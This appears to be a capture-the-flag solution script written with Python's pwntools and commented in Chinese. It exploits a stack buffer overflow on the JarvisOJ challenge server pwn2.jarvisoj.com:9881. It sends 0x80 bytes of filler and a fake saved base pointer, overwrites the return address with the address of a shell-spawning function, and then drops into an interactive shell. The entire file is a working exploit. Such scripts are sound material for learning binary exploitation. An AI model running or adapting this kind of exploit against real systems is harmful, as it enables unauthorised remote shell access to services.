# -*- coding:utf-8 -*-
from pwn import *

sh = remote("pwn2.jarvisoj.com",9881) 
junk = 'a'*0x80 # 随意填充0x80个，


fakebp = 'a'*8 # 看char buf，双击进buf，最下面还有8个bytes
syscall = 0x0000000000400596 # ida 查看 exports 填入地址
payload = junk + fakebp + p64(syscall) # 正常是vulnerable_function()返回地址，我们这里覆盖为syscall地址，得到shell
sh.send(payload)
sh.interactive()
